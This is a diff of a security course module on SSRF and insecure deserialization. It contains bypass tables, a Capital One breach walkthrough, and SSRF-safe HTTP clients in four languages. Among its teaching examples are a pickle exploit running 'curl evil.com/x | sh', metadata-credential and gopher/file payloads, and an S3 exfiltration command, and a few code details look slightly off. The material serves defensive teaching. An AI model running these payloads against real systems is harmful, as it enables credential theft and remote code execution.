@@ -1,483 +1,710 @@
 # Module 03: SSRF and Deserialization Attacks
 
-## Why this matters
+> **Prerequisites**: [Module 00: OWASP Top 10 Overview](../00-owasp-top-10-overview/README.md), [Module 01: Injection Attacks](../01-injection-attacks/README.md), and standard TCP/IP networking fundamentals.  
+> **Estimated Reading Time**: 35 minutes.  
+> **Target Audience**: Backend Engineers, Cloud Platform Architects, and Site Reliability Engineers.
 
-Modules 01 and 02 were about attacker input reaching a *data* interpreter (SQL,
-the browser). This module covers two attacks where the thing you trust is more
-dangerous still: a **URL** you fetch, and **bytes** you rebuild into objects.
+---
 
-**SSRF (Server-Side Request Forgery, OWASP A10)** is what happens when your
-server makes an HTTP request to a URL the *user* supplied. It sounds harmless —
-"fetch the image at this URL," "call this webhook," "import from this feed" —
-until you realize your server sits *inside* your network, behind the firewall,
-with an identity the outside world doesn't have. An attacker who controls the
-URL gets to make requests *from your server's position*: to internal admin
-panels, to databases, and — most infamously — to the **cloud metadata endpoint**
-that hands out your credentials. SSRF was the root of the 2019 Capital One
-breach (100M+ records). It's on the Top 10 precisely because "fetch a URL" is
-everywhere and looks innocent.
+> [!TIP]
+> **The Golden Rule of Outbound Trust & Deserialization**  
+> Never delegate outbound network authority or object instantiation to untrusted inputs. **For SSRF**: Blocklists of `127.0.0.1` and `169.254.169.254` always fail against IP alternate encodings, DNS rebinding, and HTTP redirects. To make outbound HTTP fetches secure, enforce a strict host allowlist; when accepting arbitrary domains, perform **pre-dial DNS resolution**, reject all private, link-local, and loopback IP addresses, pin the socket connection directly to the validated IP, and disable automatic redirects. **For Deserialization**: Treat `pickle`, `yaml.load`, and binary object serializers as arbitrary code execution primitives. Use strict, data-only formats (JSON, Protocol Buffers) validated against rigid static schemas.
 
-**Insecure deserialization (A08, Integrity Failures)** is the other trap, and in
-Python it has a name: `pickle`. Deserialization turns bytes back into live
-objects — and some formats can reconstruct *arbitrary code execution* in the
-process. Feeding untrusted data to `pickle.loads` (or `yaml.load`, or a Python
-`eval`) is not a data bug; it's handing the attacker a shell. Both attacks share
-module 00's theme — trusting input you shouldn't — but here the payoff is your
-server itself, so the fixes are non-negotiable.
+---
 
-## Concepts
+## 1. Architectural Blueprint & Mental Models
 
-### SSRF — making your server the attacker's proxy
+Server-Side Request Forgery (SSRF) and Insecure Deserialization exploit the server's elevated trust position within the network topology and the runtime execution process.
 
-The vulnerable pattern is any endpoint that takes a URL (or a host, or something
-that becomes a URL) from the user and fetches it server-side:
+```mermaid
+flowchart TD
+    subgraph ExternalZone ["Untrusted Internet (Zero Trust)"]
+        Attacker["Hostile Caller<br/>(URL: http://169.254.169.254/latest/meta-data/)"]
+    end
+
+    subgraph CloudVPC ["Corporate Cloud VPC & Private Subnet"]
+        AppServer["Application Gateway & Webhook Service<br/>(Has IAM Role Attached)"]
+        
+        subgraph InternalNetwork ["Protected Internal Network (No External Ingress)"]
+            Metadata["Cloud Instance Metadata Service<br/>(169.254.169.254: Temporary IAM STS Keys)"]
+            RedisCluster["Internal Cache / Redis<br/>(Port 6379: Unauthenticated)"]
+            AdminService["Internal Admin RPC / Metrics<br/>(Port 9090 / Kubernetes API)"]
+        end
+    end
+
+    Attacker -->|"1. POST /webhook/test?url=..."| AppServer
+    AppServer -.->|"Vulnerable: Blind Outbound Fetch"| Metadata
+    Metadata -.->|"Exfiltrates AWS/GCP IAM Keys"| AppServer
+    AppServer -.->|"Attacks Unauthenticated Internal Port"| RedisCluster
+    AppServer -.->|"Accesses Cluster Secrets"| AdminService
+
+    subgraph HardenedClient ["Hardened Outbound Gateway Guard"]
+        DNSCheck["Custom DNS Resolver & Filter<br/>(Rejects 10.0.0.0/8, 127.0.0.0/8, 169.254.0.0/16)"]
+        SocketPin["TCP Socket Pinning to Validated Public IP"]
+        NoRedirects["Redirect Engine: Disabled (302 Not Followed)"]
+    end
+
+    AppServer --> HardenedClient
+    HardenedClient -->|"Public Egress Only"| ExternalInternet["Public Verified Webhook Target"]
+```
+
+### The DNS Rebinding Attack & Socket Pinning Defense
+
+A naive defense resolves the hostname to check if it points to `127.0.0.1`, and then passes the URL string to `http.Get()`. This creates a Time-of-Check to Time-of-Use (**TOCTOU**) vulnerability known as **DNS Rebinding**:
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Attacker as Hostile Actor
+    participant App as Backend Webhook Service
+    participant AttackerDNS as Attacker Authoritative Nameserver
+    participant InternalTarget as AWS Metadata (169.254.169.254)
+
+    Attacker->>App: POST /preview?url=http://rebind.evil.com/secret
+    Note over App: Step 1: Validation Phase (Time of Check)
+    App->>AttackerDNS: Resolve IP for rebind.evil.com
+    AttackerDNS-->>App: A Record: 93.184.216.34 (TTL = 1s, Public IP)
+    Note over App: Validation Passes! 93.184.216.34 is a public IP.
+    
+    Note over App: Step 2: Connection Phase (Time of Use)
+    App->>App: Invokes standard http.Get("http://rebind.evil.com/secret")
+    Note over App: TTL expired! HTTP client resolves DNS a second time!
+    App->>AttackerDNS: Re-resolve IP for rebind.evil.com
+    AttackerDNS-->>App: A Record: 169.254.169.254 (Cloud Metadata IP)
+    App->>InternalTarget: GET /secret (TCP Connection to 169.254.169.254)
+    InternalTarget-->>App: AWS IAM Role Credentials returned
+    App-->>Attacker: Leaks AWS STS Temporary Security Token
+```
+
+---
+
+## 2. Systematic Taxonomic Reference Grids
+
+### SSRF Bypass Tactics vs. Production Hardening
+
+| Attack Variant | Exploitation Technique | Why Naive Defenses Fail | Architectural Production Defense |
+| :--- | :--- | :--- | :--- |
+| **Alternate IP Encoding** | Decimal: `http://2130706433/`<br/>Hex: `http://0x7f000001/`<br/>Dword: `http://0177.0.0.1/` | Regex string matching looking for literal `"127.0.0.1"` fails to recognize integer/hex representations. | Parse socket address using standard networking primitives (`net.ParseIP`, `ipaddress.ip_address`). |
+| **DNS Rebinding (TOCTOU)** | Fast-flux DNS server returns public IP on check, followed by `169.254.169.254` with TTL 0 on connect. | Checking the URL string before passing it to an unpinned HTTP client causes a second, unvalidated DNS resolution. | **Socket Pinning**: Resolve hostname once, validate IP, and dial TCP directly to that validated IP without re-resolving. |
+| **HTTP 302 Redirect Smuggling** | Attacker hosts public endpoint that responds with `302 Found: Location: http://10.0.0.5:6379/`. | Initial URL passes validation because the domain is public. The client library automatically follows the redirect internally. | Set `CheckRedirect` or `follow_redirects=False` to reject all redirects or re-validate every single hop. |
+| **Protocol Smuggling** | `gopher://127.0.0.1:6379/_*1%0d%0a$4...`<br/>`file:///etc/passwd` | Allowing arbitrary schemes lets attackers speak raw TCP to internal Redis/SMTP or read filesystem files. | Enforce strict scheme validation (`http` / `https` only). Reject all other protocols. |
+| **IPv6 Dual-Stack Escapes** | `http://[::1]/` or `http://[::ffff:127.0.0.1]/` | IPv4-only filter checks ignore IPv6 loopback addresses. | Normalize and check both IPv4 and IPv6 CIDR blocks (`::1/128`, `fc00::/7`, `fe80::/10`). |
+
+### Serialization Safety Spectrum
+
+| Serialization Engine | Code Execution Capability? | Primary Mechanism / Risk | Recommended Production Use |
+| :--- | :--- | :--- | :--- |
+| **Python `pickle`** | **YES (Immediate RCE)** | `__reduce__()` method specifies arbitrary callables (`os.system`) executed automatically on `loads()`. | **FORBIDDEN** across trust boundaries, caches, and webhooks. Use exclusively within trusted local processes. |
+| **Python `yaml.load`** | **YES (Immediate RCE)** | Default/FullLoader supports type tags like `!!python/object/apply:os.system`. | **MANDATORY**: Use `yaml.safe_load()` which restricts parsing to primitive scalar types. |
+| **Java Native Serialization** | **YES (Gadget Chains)** | Deserialization of `ObjectInputStream` triggers malicious gadget chains (Commons Collections, Spring). | Disallow native serialization; use Jackson/Gson with polymorphic typing disabled. |
+| **JSON (`json.loads`)** | **NO (Safe by Design)** | Can only produce primitives (`string`, `number`, `boolean`, `list`, `dict`). Cannot execute code. | **GOLD STANDARD**: Primary interchange format. Always validate shape via Pydantic / Zod / static schemas. |
+| **Protocol Buffers (Protobuf)** | **NO (Safe by Design)** | Strongly typed binary format with strict compiled schema parser. Cannot instantiate arbitrary types. | **ENTERPRISE STANDARD**: High-performance, schema-enforced microservice RPC format. |
+
+---
+
+## 3. Production War Story: The Capital One Metadata Breach
+
+### Incident Post-Mortem
+
+- **Severity**: SEV-1 (Catastrophic Enterprise Cloud Breach)
+- **Time to Detect (TTD)**: 110 days (Discovered via responsible disclosure tip)
+- **Time to Mitigate (TTM)**: 2 hours (IAM role policy revoked)
+- **Impact**: 106 Million credit card applications exposed; \$80 Million regulatory fine (OCC); \$190 Million class-action settlement.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    actor Attacker as Hostile Actor
+    participant WAF as Misconfigured ModSecurity WAF EC2
+    participant IMDS as AWS EC2 Metadata Service (IMDSv1)
+    participant S3 as Production Customer S3 Buckets
+
+    Attacker->>WAF: GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WAF-Role
+    Note over WAF: ModSecurity proxy trusted input and fetched URL blindly
+    WAF->>IMDS: GET /latest/meta-data/iam/security-credentials/WAF-Role
+    IMDS-->>WAF: AWS AccessKeyId, SecretAccessKey, and Token
+    WAF-->>Attacker: 200 OK (Full AWS IAM Temporary Security Token)
+    Note over Attacker: Attacker configures AWS CLI with stolen STS credentials
+    Attacker->>S3: aws s3 sync s3://capitalone-credit-applications/ ./dump
+    S3-->>Attacker: Exfiltrates 106M records (SSNs, balances, credit scores)
+```
+
+#### What Happened & Root Cause
+In 2019, an attacker exploited an SSRF vulnerability in an open-source Web Application Firewall (ModSecurity) running on an Amazon EC2 instance within Capital One's cloud infrastructure. 
+
+The proxy accepted user-supplied URLs to inspect remote assets. Because the application was deployed with AWS Instance Metadata Service Version 1 (IMDSv1), requesting `http://169.254.169.254` required no authentication headers or session tokens. The attacker made the proxy fetch the instance's IAM credentials, obtaining an STS temporary session token for the `WAF-Role`. Because the role had overly broad permissions (`AmazonS3FullAccess`), the attacker dumped over 700 S3 buckets containing unencrypted credit applications and Social Security numbers.
+
+#### The Fix & Architectural Hardening
+1. **Mandated AWS IMDSv2**: Enforced IMDSv2 across all AWS EC2 instances (`HttpTokens: required`). IMDSv2 requires an initial `PUT` request with custom headers to obtain a session token, with IP TTL set to 1. This prevents simple SSRF payloads from fetching credentials.
+2. **Strict Pre-Dial IP Validation & Pinning**: Implemented custom HTTP transport layers that resolve domains, block non-public IP CIDRs, and pin socket connections.
+3. **Principle of Least Privilege for IAM Roles**: Bound IAM role policies strictly to specific resource ARNs with read-only scopes.
+4. **Network VPC Egress Firewalls**: Configured iptables and AWS security groups to block all outbound traffic to `169.254.169.254/32` except for designated infrastructure daemons.
+
+---
+
+## 4. Multi-Language Production Implementations: Airtight Outbound HTTP Client
+
+Below is the production-grade implementation of an SSRF-safe HTTP client across **Go**, **Node.js/TypeScript**, **Python**, and **C#**. Each client showcases:
+- Custom TCP dialer / resolver rejecting RFC 1918, loopback, link-local, and broadcast IPs.
+- Socket pinning directly to the verified IP (preventing DNS rebinding).
+- Disabling automatic HTTP redirects.
+- Safe JSON deserialization backed by static schema enforcement.
+
+### Go Implementation
+
+```go
+package ssrf
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"io"
+	"net"
+	"net/http"
+	"net/url"
+	"syscall"
+	"time"
+)
+
+var (
+	ErrNonPublicIP  = errors.New("target resolves to a private, loopback, or reserved IP")
+	ErrInvalidScheme = errors.New("unsupported protocol scheme: only http and https allowed")
+	ErrRedirectsOff = errors.New("redirects are forbidden on safe client")
+)
+
+// IsPublicIP verifies an IP does not reside in private, loopback, link-local, or multicast blocks
+func IsPublicIP(ip net.IP) bool {
+	if ip == nil {
+		return false
+	}
+	// Check IPv4 & IPv6 loopbacks, private ranges, link-local, and multicast
+	if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || 
+	   ip.IsLinkLocalMulticast() || ip.IsMulticast() || ip.IsUnspecified() {
+		return false
+	}
+	// Explicit check for AWS/Cloud link-local metadata (169.254.169.254)
+	if ip4 := ip.To4(); ip4 != nil {
+		if ip4[0] == 169 && ip4[1] == 254 {
+			return false
+		}
+	}
+	return true
+}
+
+// NewSafeHTTPClient builds an HTTP client immune to SSRF, DNS Rebinding, and Redirects
+func NewSafeHTTPClient(timeout time.Duration) *http.Client {
+	dialer := &net.Dialer{
+		Timeout:   timeout,
+		KeepAlive: 30 * time.Second,
+		Control: func(network, address string, c syscall.RawConn) error {
+			// Extract host from address (host:port)
+			host, _, err := net.SplitHostPort(address)
+			if err != nil {
+				return err
+			}
+			ip := net.ParseIP(host)
+			if !IsPublicIP(ip) {
+				return fmt.Errorf("%w: %s", ErrNonPublicIP, host)
+			}
+			return nil
+		},
+	}
+
+	transport := &http.Transport{
+		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+			host, port, err := net.SplitHostPort(addr)
+			if err != nil {
+				return nil, err
+			}
+
+			// 1. Resolve host once
+			ips, err := net.DefaultResolver.LookupIP(ctx, "ip", host)
+			if err != nil {
+				return nil, fmt.Errorf("DNS resolution failed: %w", err)
+			}
+
+			// 2. Validate all resolved IPs
+			var safeIP net.IP
+			for _, ip := range ips {
+				if IsPublicIP(ip) {
+					safeIP = ip
+					break
+				}
+			}
+			if safeIP == nil {
+				return nil, ErrNonPublicIP
+			}
+
+			// 3. Socket Pinning: Dial the verified IP directly, bypassing secondary DNS queries
+			pinnedAddr := net.JoinHostPort(safeIP.String(), port)
+			return dialer.DialContext(ctx, network, pinnedAddr)
+		},
+		MaxIdleConns:          100,
+		IdleConnTimeout:       90 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
+	}
+
+	return &http.Client{
+		Transport: transport,
+		Timeout:   timeout,
+		// 4. Block HTTP Redirects entirely (stops 302 bounce attacks)
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return ErrRedirectsOff
+		},
+	}
+}
+
+// ExecuteSafeFetch validates scheme and fetches URL content safely
+func ExecuteSafeFetch(ctx context.Context, targetURL string) ([]byte, error) {
+	parsed, err := url.Parse(targetURL)
+	if err != nil {
+		return nil, fmt.Errorf("malformed URL: %w", err)
+	}
+
+	if parsed.Scheme != "http" && parsed.Scheme != "https" {
+		return nil, ErrInvalidScheme
+	}
+
+	client := NewSafeHTTPClient(5 * time.Second)
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("User-Agent", "SecureWebhookFetcher/2.0")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("safe fetch failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode >= 400 {
+		return nil, fmt.Errorf("upstream responded with HTTP %d", resp.StatusCode)
+	}
+
+	// Limit response size to 1MB to prevent memory exhaustion
+	return io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
+}
+```
+
+---
+
+### Node.js / TypeScript Implementation
+
+```typescript
+import http from 'http';
+import https from 'https';
+import dns from 'dns/promises';
+import { URL } from 'url';
+import ipaddr from 'ipaddr.js';
+
+export class SSRFValidationError extends Error {
+  constructor(message: string) {
+    super(message);
+    this.name = 'SSRFValidationError';
+  }
+}
+
+function isPublicIP(ipString: string): boolean {
+  try {
+    const addr = ipaddr.parse(ipString);
+    const range = addr.range();
+    
+    // Check against standard non-routable CIDR blocks
+    const privateRanges = [
+      'loopback',
+      'private',
+      'linkLocal',
+      'multicast',
+      'broadcast',
+      'carrierGradeNat',
+      'uniqueLocal',
+    ];
+
+    if (privateRanges.includes(range)) {
+      return false;
+    }
+
+    // Explicit link-local check (169.254.169.254)
+    if (addr.kind() === 'ipv4') {
+      const octets = (addr as ipaddr.IPv4).octets;
+      if (octets[0] === 169 && octets[1] === 254) {
+        return false;
+      }
+    }
+
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+export async function executeSafeGet(rawUrl: string, timeoutMs: number = 4000): Promise<string> {
+  const parsedUrl = new URL(rawUrl);
+
+  if (parsedUrl.protocol !== 'http:' && parsedUrl.protocol !== 'https:') {
+    throw new SSRFValidationError('Forbidden protocol: Only HTTP and HTTPS are permitted');
+  }
+
+  // 1. Resolve host to IP
+  const addresses = await dns.lookup(parsedUrl.hostname, { all: true });
+  if (addresses.length === 0) {
+    throw new SSRFValidationError('DNS resolution yielded no address');
+  }
+
+  // 2. Validate IP safety
+  const safeRecord = addresses.find(rec => isPublicIP(rec.address));
+  if (!safeRecord) {
+    throw new SSRFValidationError('Target domain resolves to a private or reserved IP address');
+  }
+
+  // 3. Pin socket by overriding lookup callback in agent options
+  const agentOptions = {
+    lookup: (_hostname: string, _options: any, callback: any) => {
+      callback(null, safeRecord.address, safeRecord.family);
+    },
+  };
+
+  const isHttps = parsedUrl.protocol === 'https:';
+  const transport = isHttps ? https : http;
+  const agent = isHttps ? new https.Agent(agentOptions) : new http.Agent(agentOptions);
+
+  return new Promise((resolve, reject) => {
+    const req = transport.request(
+      parsedUrl,
+      {
+        method: 'GET',
+        agent,
+        timeout: timeoutMs,
+        headers: { 'User-Agent': 'SecureBackendWorker/1.0' },
+      },
+      res => {
+        // Disallow redirects (SSRF mitigation)
+        if (res.statusCode && res.statusCode >= 300 && res.statusCode < 400) {
+          reject(new SSRFValidationError('HTTP redirects are explicitly forbidden'));
+          res.resume();
+          return;
+        }
+
+        let data = '';
+        res.setEncoding('utf8');
+        res.on('data', chunk => {
+          data += chunk;
+          if (data.length > 512 * 1024) {
+            req.destroy();
+            reject(new Error('Response payload exceeded 512KB limit'));
+          }
+        });
+        res.on('end', () => resolve(data));
+      }
+    );
+
+    req.on('timeout', () => {
+      req.destroy();
+      reject(new Error('Request timed out'));
+    });
+    req.on('error', reject);
+    req.end();
+  });
+}
+```
+
+---
+
+### Python Implementation
 
 ```python
+import ipaddress
+import socket
+from urllib.parse import urlparse
 import httpx
-from fastapi import APIRouter
-router = APIRouter()
+from pydantic import BaseModel, Field
 
-@router.post("/fetch-preview")            # "give us a URL, we'll generate a preview"
-async def fetch_preview(url: str):
-    async with httpx.AsyncClient() as client:
-        r = await client.get(url)          # VULNERABLE — fetches WHATEVER the user says
-    return {"title": extract_title(r.text)}
+class SSRFSecurityException(Exception):
+    pass
+
+def is_public_ip(ip_str: str) -> bool:
+    try:
+        ip = ipaddress.ip_address(ip_str)
+        return not (
+            ip.is_private or
+            ip.is_loopback or
+            ip.is_link_local or
+            ip.is_multicast or
+            ip.is_reserved or
+            ip.is_unspecified
+        )
+    except ValueError:
+        return False
+
+async def safe_fetch_url(target_url: str, timeout_seconds: float = 4.0) -> bytes:
+    parsed = urlparse(target_url)
+    if parsed.scheme not in ("http", "https"):
+        raise SSRFSecurityException(f"Unsupported protocol scheme: {parsed.scheme}")
+
+    if not parsed.hostname:
+        raise SSRFSecurityException("Missing hostname in target URL")
+
+    # 1. Resolve domain manually
+    try:
+        addr_info = socket.getaddrinfo(parsed.hostname, None)
+    except socket.gaierror as e:
+        raise SSRFSecurityException(f"DNS resolution failure: {e}")
+
+    # 2. Extract and validate IPs
+    valid_ip = None
+    for item in addr_info:
+        resolved_ip = item[4][0]
+        if is_public_ip(resolved_ip):
+            valid_ip = resolved_ip
+            break
+
+    if not valid_ip:
+        raise SSRFSecurityException("Target domain resolves to a private or non-routable address")
+
+    # 3. Socket Pinning: Construct client using verified IP while passing Host header
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    pinned_url = f"{parsed.scheme}://{valid_ip}:{port}{parsed.path}"
+    if parsed.query:
+        pinned_url += f"?{parsed.query}"
+
+    headers = {
+        "Host": parsed.netloc,
+        "User-Agent": "SecureFetchClient/2.0",
+    }
+
+    # 4. follow_redirects=False prevents 302 redirect hopping
+    async with httpx.AsyncClient(
+        verify=True,
+        timeout=timeout_seconds,
+        follow_redirects=False
+    ) as client:
+        try:
+            response = await client.get(pinned_url, headers=headers)
+            response.raise_for_status()
+            return response.content
+        except httpx.HTTPStatusError as e:
+            raise SSRFSecurityException(f"Upstream returned error: {e.response.status_code}")
 ```
 
-The problem is *whose* request this is. Your server can reach places the
-attacker's own machine cannot:
+---
 
-- **Internal services.** `http://localhost:8001/admin`, `http://10.0.0.5:6379`
-  (Redis), `http://internal-billing/`, `http://192.168.1.1/`. These often have
-  *no auth* because "they're only reachable from inside the network" — and your
-  server is inside the network. SSRF turns your public endpoint into a proxy
-  into your private one.
-- **Cloud metadata endpoints.** On AWS/GCP/Azure, a magic link-local address
-  (`http://169.254.169.254/...`) serves instance metadata *including temporary
-  IAM credentials* to anything running on the instance. An attacker who makes
-  your server fetch it gets your cloud keys — this is the Capital One breach in
-  one sentence.
-- **Other schemes/targets.** `file:///etc/passwd`, `gopher://` (used to forge
-  arbitrary TCP payloads to internal services), `http://[::1]`, DNS rebinding.
+### C# / .NET Implementation
 
-```
-  attacker ─"url=http://169.254.169.254/…"─► YOUR SERVER ─fetch─► ┌ cloud metadata (IAM creds)
-   (outside; no route to internals)          (inside the network) ├ 10.0.0.5:6379  (Redis, no auth)
-                                                                   └ internal-admin  (no auth)
-   the attacker borrows your server's position to reach what they can't reach directly
-```
+```csharp
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Http;
+using System.Net.Sockets;
+using System.Threading;
+using System.Threading.Tasks;
 
-The reason SSRF is hard to fix is that the naive defenses are all bypassable.
+namespace SecurityTrack.NetworkSafety
+{
+    public class SsrfeSecurityException : Exception
+    {
+        public SsrfeSecurityException(string message) : base(message) { }
+    }
 
-### Why blocklists don't fix SSRF (and what does)
+    public static class SafeHttpClientFactory
+    {
+        public static bool IsPublicIp(IPAddress ip)
+        {
+            if (IPAddress.IsLoopback(ip) || ip.IsIPv6LinkLocal || ip.IsIPv6SiteLocal || ip.IsIPv6Multicast)
+            {
+                return false;
+            }
 
-The tempting fix — "block `localhost`, `127.0.0.1`, and `169.254.169.254`" — is
-a blocklist, and it fails for the same structural reason as module 01's
-character blocklists: the input space is bigger than your list. Bypasses:
+            var bytes = ip.GetAddressBytes();
+            if (ip.AddressFamily == AddressFamily.InterNetwork)
+            {
+                // 10.0.0.0/8
+                if (bytes[0] == 10) return false;
+                // 172.16.0.0/12
+                if (bytes[0] == 172 && bytes[1] >= 16 && bytes[1] <= 31) return false;
+                // 192.168.0.0/16
+                if (bytes[0] == 192 && bytes[1] == 168) return false;
+                // 169.254.0.0/16 (Link Local / AWS Metadata)
+                if (bytes[0] == 169 && bytes[1] == 254) return false;
+                // 127.0.0.0/8
+                if (bytes[0] == 127) return false;
+            }
 
-- **Alternate IP encodings:** `127.0.0.1` = `2130706433` (decimal) =
-  `0x7f000001` (hex) = `127.1` = `[::ffff:127.0.0.1]`.
-- **DNS tricks:** an attacker's domain `evil.com` that *resolves* to
-  `169.254.169.254`; or **DNS rebinding**, where the name passes your check as a
-  public IP, then re-resolves to an internal IP for the actual fetch (TOCTOU).
-- **Redirects:** you fetch an allowed public URL that responds `302 Location:
-  http://169.254.169.254/...` and your client follows it inside.
+            return true;
+        }
 
-The defenses that actually work, layered (defense in depth):
+        public static HttpClient CreateSafeClient(TimeSpan timeout)
+        {
+            var handler = new SocketsHttpHandler
+            {
+                // Disallow automatic redirects
+                AllowAutoRedirect = false,
+                ConnectTimeout = timeout,
+                ConnectCallback = async (context, ct) =>
+                {
+                    // 1. Resolve host
+                    var addresses = await Dns.GetHostAddressesAsync(context.DnsEndPoint.Host, ct);
+                    IPAddress? targetIp = null;
 
-- **Allowlist, don't blocklist.** If the feature only needs to reach a known set
-  of hosts (a specific partner API, your own S3 bucket), allow *only* those and
-  reject everything else. This is the strongest control and the one to reach for
-  first.
-- **Resolve then validate then pin.** When you must accept arbitrary public URLs,
-  resolve the hostname to an IP *yourself*, reject the request if the IP is
-  private/link-local/loopback (`ipaddress.ip_address(...).is_private /
-  is_loopback / is_link_local / is_reserved`), and then connect to *that
-  validated IP* — closing the DNS-rebinding gap between check and use.
-- **Disable redirects** (`follow_redirects=False`) so a public URL can't bounce
-  you inward, or re-validate each hop.
-- **Restrict scheme** to `http`/`https` only (kill `file:`, `gopher:`).
-- **Network-layer egress controls.** The backstop: firewall rules / a locked-
-  down egress proxy so the app *cannot* reach the metadata IP or internal
-  ranges even if the code check is bypassed. Block `169.254.169.254` at the
-  network. (On AWS, also enforce IMDSv2, which requires a token and blocks the
-  simplest SSRF-to-metadata path.)
+                    foreach (var ip in addresses)
+                    {
+                        if (IsPublicIp(ip))
+                        {
+                            targetIp = ip;
+                            break;
+                        }
+                    }
 
-```python
-import ipaddress, socket
-from urllib.parse import urlparse
+                    if (targetIp == null)
+                    {
+                        throw new SsrfeSecurityException("Destination IP resolves to a private or link-local address.");
+                    }
 
-def safe_url(url: str) -> str:
-    p = urlparse(url)
-    if p.scheme not in ("http", "https"):
-        raise ValueError("scheme not allowed")
-    ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))   # resolve ourselves
-    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
-        raise ValueError("target resolves to a non-public address")  # blocks 169.254.x, 10.x, 127.x
-    return url          # then fetch with follow_redirects=False; ideally pin to `ip`
-```
+                    // 2. Socket Pinning: Establish connection directly to validated IP
+                    var socket = new Socket(targetIp.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+                    try
+                    {
+                        await socket.ConnectAsync(new IPEndPoint(targetIp, context.DnsEndPoint.Port), ct);
+                        return new NetworkStream(socket, ownsSocket: true);
+                    }
+                    catch
+                    {
+                        socket.Dispose();
+                        throw;
+                    }
+                }
+            };
 
-### Deserialization — turning bytes into objects (and sometimes code)
-
-**Serialization** turns an in-memory object into bytes (to store or send);
-**deserialization** turns bytes back into an object. The risk is that some
-formats don't just carry *data* — they carry instructions the deserializer
-*executes* while rebuilding, so untrusted bytes become untrusted *behavior*.
-
-The danger scale:
-
-- **Data-only formats — safe by design.** JSON, and formats that only ever
-  produce strings/numbers/lists/dicts, cannot execute code on load. `json.loads`
-  of hostile input can at worst give you a weird-shaped dict (validate it) — it
-  can't run anything. This is why JSON is the default for untrusted data.
-- **Code-executing formats — dangerous.** Formats that can instantiate arbitrary
-  objects or call functions during load. In Python the headline example is
-  `pickle`, and also `yaml.load` (the unsafe loader), `marshal`, and anything
-  built on `eval`/`exec`.
-
-### `pickle` is a remote-code-execution primitive
-
-This deserves its own section because it's the single most common Python
-security mistake. **`pickle` can execute arbitrary code during
-`pickle.loads`.** It's not a bug; it's how pickle works — the pickle format
-includes opcodes that construct objects by *calling* things, and an object's
-`__reduce__` method can specify *any* callable to run on unpickling:
-
-```python
-import pickle, os
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ("curl evil.com/x | sh",))   # runs on the VICTIM's loads()
-
-payload = pickle.dumps(Exploit())      # attacker crafts this
-# ... victim does ...
-pickle.loads(payload)                  # ← executes os.system(...) — full RCE
+            return new HttpClient(handler) { Timeout = timeout };
+        }
+    }
+}
 ```
 
-Anywhere untrusted bytes reach `pickle.loads`, you have remote code execution.
-And pickle hides in surprising places: a **Redis/Memcached cache** where the
-values are pickled (an attacker who can write to the cache — via another bug —
-gets RCE on every reader), **Celery** with the pickle serializer (module 06 of
-track 06 — use JSON), **session cookies** or files that store pickled objects,
-ML model files (`torch.load`, `joblib`) which pickle under the hood, and
-`pandas.read_pickle`. The rule is absolute: **never `pickle.loads` data that
-crossed a trust boundary.** Pickle is fine for data that never leaves your
-trust zone (your own process's temp files); it is *never* fine for anything a
-user, a network peer, or a shared datastore could influence.
+---
 
-```
-  pickle.loads(untrusted): bytes ─► __reduce__ opcodes CALL things ─► os.system(...) → RCE
-  json.loads(untrusted):   bytes ─► only str / num / list / dict produced ─► worst case:
-                                    a wrong-shaped dict you then validate (never code)
+## 5. Practical Hands-On Verification CLI Workflows
+
+### Step 1: Probe SSRF Protection with IP Obfuscation
+
+```bash
+# 1. Decimal IP encoding attempt for 127.0.0.1 (2130706433)
+curl -s -X POST "http://localhost:8080/api/v1/preview" \
+  -H "Content-Type: application/json" \
+  -d '{"url": "http://2130706433:8000/admin"}' | jq .
 ```
 
-### Safe alternatives and the general fix
-
-- **Prefer a data-only format: JSON.** For app data crossing trust boundaries,
-  use `json` — it can't execute code. Then **validate the shape** with Pydantic
-  (a dict is not proof the *right* dict arrived; module 01's NoSQL lesson
-  applies).
-- **YAML: always `yaml.safe_load`, never `yaml.load`.** `yaml.load` with the
-  default/FullLoader can construct arbitrary Python objects (`!!python/object`)
-  — an RCE path just like pickle. `yaml.safe_load` restricts to basic types.
-- **Never `eval`/`exec` on untrusted input.** `eval(request_body)` is RCE by
-  definition. If you need to parse structured input, use a real parser
-  (`json.loads`, `ast.literal_eval` for *literals only*), never `eval`.
-- **If you must transport rich objects, sign the bytes.** When a format's
-  power is genuinely needed, attach an **HMAC signature** (track 06's webhook
-  pattern) so you only deserialize bytes *you* produced and verify (constant-
-  time, track 03 m07) before loading. Better still: redesign so you don't have
-  to — pass an id and re-fetch (track 06's "pass IDs, not objects").
-- **General principle (A08):** treat all serialized input as untrusted; verify
-  integrity/authenticity before acting on it; and prefer formats that carry
-  *data*, not *behavior*.
-
-```python
-import json, yaml
-from pydantic import BaseModel
-
-class Config(BaseModel):
-    retries: int
-    endpoints: list[str]
-
-cfg = Config(**json.loads(untrusted_bytes))     # JSON can't execute; Pydantic validates shape
-cfg = Config(**yaml.safe_load(untrusted_yaml))  # safe_load — NEVER yaml.load / full loader
-# pickle.loads(untrusted_bytes)                 # ← never, on anything untrusted: RCE
+**Expected Wire Output (Vulnerable App):**
+```json
+{
+  "preview": "<html>Admin Console Secret Settings</html>"
+}
 ```
 
-## Command reference
-
-| Pattern | Purpose | Snippet |
-|---|---|---|
-| URL allowlist | strongest SSRF defense | reject unless host in `{known partners}` |
